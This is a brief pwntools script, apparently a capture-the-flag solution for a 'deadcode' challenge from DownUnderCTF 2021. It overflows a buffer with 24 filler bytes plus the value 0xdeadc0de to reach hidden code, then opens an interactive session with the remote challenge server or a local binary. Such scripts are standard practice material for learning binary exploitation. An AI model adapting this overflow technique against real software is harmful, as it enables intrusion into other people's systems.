from pwn import *

e = ELF("./deadcode",checksec=False)
context.binary = e

if args.REMOTE:
  pipe = remote("pwn-2021.duc.tf", 31916)
else:
  pipe = process(e.path)

# send 24 bytes of filler followed by 'deadcode' to execute the dead code
pipe.sendlineafter(b"app?\n",b"A"*24 + p64(0xdeadc0de))

pipe.interactive()
